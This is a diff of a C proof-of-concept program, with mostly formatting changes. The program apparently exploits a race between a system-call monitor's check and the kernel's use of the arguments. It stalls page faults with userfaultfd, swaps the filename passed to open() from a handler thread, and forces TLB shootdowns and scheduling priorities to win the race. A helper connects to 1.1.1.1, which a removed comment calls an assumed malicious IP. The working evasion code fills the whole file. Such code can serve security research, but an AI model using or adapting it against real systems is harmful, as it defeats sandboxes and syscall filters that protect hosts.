@@ -84,20 +84,19 @@ write_char(char *string, int len)
   }
 }
 
-static inline void maccess(void *p) {
-  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
-}
-
-static inline void flush(void *p) {
+static inline void 
+flush(void *p) 
+{
     asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
 }
 
-// receiver waits for the signal from the sender
-FORCE_INLINE void receiver() {
+/* receiver waits for the signal from the sender */
+FORCE_INLINE void 
+receiver() 
+{
   for(;;) {
 	  pthread_mutex_lock( &condition_mutex );
     while( count >= COUNT_HALT1 && count <= COUNT_HALT2 )  {
-    //while( count < COUNT_HALT1 )  {
       pthread_cond_wait( &condition_cond, &condition_mutex );
     }
     pthread_mutex_unlock( &condition_mutex );
@@ -110,14 +109,14 @@ FORCE_INLINE void receiver() {
     pthread_mutex_unlock( &count_mutex );
 
     if(count >= COUNT_DONE) return;
-
-    //return;
   }
 }
 
-// sender increments conditional variable and send signal based on COUNT_HALT1
-// then it waits in a few more loop iterations
-FORCE_INLINE void sender() {
+/* sender increments conditional variable and send signal based on COUNT_HALT1
+ then it waits in a few more loop iterations */
+FORCE_INLINE void 
+sender() 
+{
   for(;;) {
 	  pthread_mutex_lock( &condition_mutex );
     //if( count >= COUNT_HALT1 ) {
@@ -171,91 +170,83 @@ FORCE_INLINE void set_affinity(int cpuid)
 static void *
 fault_handler_thread(void *arg)
 {
-    static struct uffd_msg msg;   /* Data read from userfaultfd */
-    static int fault_cnt = 0;     /* Number of faults so far handled */
-    long uffd;                    /* userfaultfd file descriptor */
-    static char *page = NULL;
-    struct uffdio_copy uffdio_copy;
-    ssize_t nread;
+  static struct uffd_msg msg;   /* Data read from userfaultfd */
+  static int fault_cnt = 0;     /* Number of faults so far handled */
+  long uffd;                    /* userfaultfd file descriptor */
+  static char *page = NULL;
+  struct uffdio_copy uffdio_copy;
+  ssize_t nread;
 
-    uffd = (long) arg;
-    
-    set_affinity(FAULT_THREAD_CPU);
-    /* Create a page that will be copied into the faulting region */
-    if (page == NULL) {
-        page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
-                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-        if (page == MAP_FAILED)
-            handle_error_en(page, "mmap");
-    }
+  uffd = (long) arg;
+  
+  set_affinity(FAULT_THREAD_CPU);
+  /* Create a page that will be copied into the faulting region */
+  if (page == NULL) {
+    page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
+                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (page == MAP_FAILED)
+      handle_error_en(page, "mmap");
+  }
 
-    /* Loop, handling incoming events on the userfaultfd
-       file descriptor */
-    for (;;) {
-        /* See what poll() tells us about the userfaultfd */
-        struct pollfd pollfd;
-        int nready;
-        pollfd.fd = uffd;
-        pollfd.events = POLLIN;
-        nready = poll(&pollfd, 1, -1);
-        if (nready == -1)
-            handle_error_en(nready, "poll");
+  /* Loop, handling incoming events on the userfaultfd
+     file descriptor */
+  for (;;) {
+    /* See what poll() tells us about the userfaultfd */
+    struct pollfd pollfd;
+    int nready;
+    pollfd.fd = uffd;
+    pollfd.events = POLLIN;
+    nready = poll(&pollfd, 1, -1);
+    if (nready == -1)
+      handle_error_en(nready, "poll");
 #ifdef VERBOSE        
-        printf("\nfault_handler_thread():\n");
-        printf("    poll() returns: nready = %d; "
-                "POLLIN = %d; POLLERR = %d\n", nready,
-                (pollfd.revents & POLLIN) != 0,
-                (pollfd.revents & POLLERR) != 0);
+      printf("\nfault_handler_thread():\n");
+      printf("    poll() returns: nready = %d; "
+              "POLLIN = %d; POLLERR = %d\n", nready,
+              (pollfd.revents & POLLIN) != 0,
+              (pollfd.revents & POLLERR) != 0);
 #endif        
-        /* Read an event from the userfaultfd */
+      /* Read an event from the userfaultfd */
+      nread = read(uffd, &msg, sizeof(msg));
+      if (nread == 0) {
+        printf("EOF on userfaultfd!\n");
+        exit(EXIT_FAILURE);
+      }
 
-        nread = read(uffd, &msg, sizeof(msg));
-        if (nread == 0) {
-            printf("EOF on userfaultfd!\n");
-            exit(EXIT_FAILURE);
-        }
+      if (nread == -1)
+        handle_error_en(nread, "read");
 
-        if (nread == -1)
-            handle_error_en(nread, "read");
+      /* We expect only one kind of event; verify that assumption */
+      if (msg.event != UFFD_EVENT_PAGEFAULT) {
+        fprintf(stderr, "Unexpected event on userfaultfd\n");
+        exit(EXIT_FAILURE);
+      }
 
-        /* We expect only one kind of event; verify that assumption */
-
-        if (msg.event != UFFD_EVENT_PAGEFAULT) {
-            fprintf(stderr, "Unexpected event on userfaultfd\n");
-            exit(EXIT_FAILURE);
-        }
-
-        /* Display info about the page-fault event */
+      /* Display info about the page-fault event */
 #ifdef VERBOSE      
-        printf("    UFFD_EVENT_PAGEFAULT event: ");
-        printf("flags = %llx; ", msg.arg.pagefault.flags);
-        printf("address = %llx\n", msg.arg.pagefault.address);
+      printf("    UFFD_EVENT_PAGEFAULT event: ");
+      printf("flags = %llx; ", msg.arg.pagefault.flags);
+      printf("address = %llx\n", msg.arg.pagefault.address);
 #endif
-
-        uffdio_copy.src = (unsigned long) page;
-
-        /* We need to handle page faults in units of pages(!).
-           So, round faulting address down to page boundary */
-
-        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
+      uffdio_copy.src = (unsigned long) page;
+      /* We need to handle page faults in units of pages(!).
+         So, round faulting address down to page boundary */
+      uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                            ~(page_size - 1);
-        uffdio_copy.len = page_size;
-        uffdio_copy.mode = 0;
-        uffdio_copy.copy = 0;
+      uffdio_copy.len = page_size;
+      uffdio_copy.mode = 0;
+      uffdio_copy.copy = 0;
 
-        //asm volatile("mfence");
-        //write_char(filename, sizeof(filename));
-        strncpy(page, filename, sizeof(filename));
-        //asm volatile("mfence");
-        flush(page);
-        // release mutex
-        sender(); 
+      strncpy(page, filename, sizeof(filename));
+      flush(page);
+      /* release mutex */
+      sender(); 
 
-        printf("Before ioctl\n");
-        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
-            handle_error_en(-1, "ioctl-UFFDIO_COPY");
+      printf("Before ioctl\n");
+      if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
+        handle_error_en(-1, "ioctl-UFFDIO_COPY");
 
-        printf("        (uffdio_copy.copy returned %lld)\n",
+      printf("        (uffdio_copy.copy returned %lld)\n",
                 uffdio_copy.copy);
     }
 }
@@ -264,7 +255,6 @@ int
 userfaultfd_setup(char *addr, int num_pages)
 {
     long uffd;          /* userfaultfd file descriptor */
-    //char *addr;         /* Start of region handled by userfaultfd */
     unsigned long len;  /* Length of region handled by userfaultfd */
     pthread_t thr;      /* ID of thread that handles page faults */
     struct uffdio_api uffdio_api;
@@ -275,7 +265,6 @@ userfaultfd_setup(char *addr, int num_pages)
     len = num_pages * page_size;
 
     /* Create and enable userfaultfd object */
-
     uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
     if (uffd == -1)
         handle_error_en(-1, "userfaultfd");
@@ -288,17 +277,16 @@ userfaultfd_setup(char *addr, int num_pages)
     /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */
-
     uffdio_register.range.start = (unsigned long) addr;
     uffdio_register.range.len = len;
     uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
     if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
-        handle_error_en(-1, "ioctl-UFFDIO_REGISTER");
+      handle_error_en(-1, "ioctl-UFFDIO_REGISTER");
 
     /* Create a thread that will process the userfaultfd events */
     s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
     if (s != 0) {
-        handle_error_en(s, "pthread_create");
+      handle_error_en(s, "pthread_create");
     }
    
 }
@@ -356,11 +344,11 @@ nanosleep_helper(long nsec)
    (
        "syscall"
        : "=a" (ret)
-       //                      EDI      RSI  
+       /*                      RDI      RSI  */
        : "0"(__NR_nanosleep), "D"(&req), "S"(&rem)
        : "rcx", "r11", "memory"
    );
-   // note: no error check to saves cycles
+   /* note: no error check to saves cycles */
    return ret;
 }
 
@@ -369,10 +357,8 @@ do_connect(struct sockaddr_in *serv_addr)
 {
   int sockfd, portno, n;
   struct hostent *server;
-
   char buffer[256];
-
-  //printf("do_connect\n");
+  
   portno = 80;
 
   /* Create a socket point */
@@ -383,7 +369,6 @@ do_connect(struct sockaddr_in *serv_addr)
     exit(1);
   }
 
-  // We assume 1.1.1.1 is a malicious IP
   server = gethostbyname("1.1.1.1");
 
   if (server == NULL) {
@@ -418,7 +403,7 @@ thread_start(void *arg)
   asm volatile("mfence");
   flush(page);
   
-  // trigger fault
+  /* trigger interrupt */
 #ifdef TLBSHOOTDOWN_MPROTECT
   int s = mprotect((void *)page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
   if (s != 0) {
@@ -431,7 +416,7 @@ thread_start(void *arg)
 }
 
 
-// set the scheduling priority for each thread
+/* set the scheduling priority for each thread */
 void 
 set_child_scheduling(pthread_attr_t* attr, int policy, int priority) 
 {
@@ -464,14 +449,14 @@ main(int argc, char *argv[])
 
   set_affinity(VICTIM_CPU);
   
-  // set up the page
+  /* set up the page */
   page_size = sysconf(_SC_PAGE_SIZE);
   page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (page == MAP_FAILED)
     handle_error_en(page, "mmap failure");
 
-  // set up userfaultfd
+  /* set up userfaultfd */
   s = userfaultfd_setup(page, 1);
   if (s < 0)
     handle_error_en(s, "userfaultfd_setup error");
@@ -480,7 +465,7 @@ main(int argc, char *argv[])
   if (s != 0)
     handle_error_en(s, "pthread_attr_init");
 
-  // set up priority for main thread
+  /* set up priority for main thread */
   int priority = 0;
   param.sched_priority = priority;
   policy = SCHED_IDLE;
@@ -496,21 +481,21 @@ main(int argc, char *argv[])
   policy = SCHED_RR;
   set_child_scheduling(&attr, policy, priority); 
   
-  // start new thread 
+  /* start new thread */
   s = pthread_create(&thread, &attr, &thread_start, NULL);
   if (s != 0)
-      handle_error_en(s, "pthread_create");
+    handle_error_en(s, "pthread_create");
 
-  // good sleep delay for mprotect
+  /* busy delay */
   busyloop(320000000);
-  // syscall openat 
+  /* syscall openat */
   int myfd = open(page, O_CREAT|O_RDWR|O_DIRECT, 0640);
   if (myfd < 0) 
-      handle_error_en(myfd, "open failure");
+    handle_error_en(myfd, "open failure");
  
-  // wait for thread to finish 
+  /* wait for thread to finish */
   s = pthread_join(thread, NULL);
   if (s != 0)
-      handle_error_en(s, "pthread_join");
+    handle_error_en(s, "pthread_join");
   exit(EXIT_SUCCESS);
 }
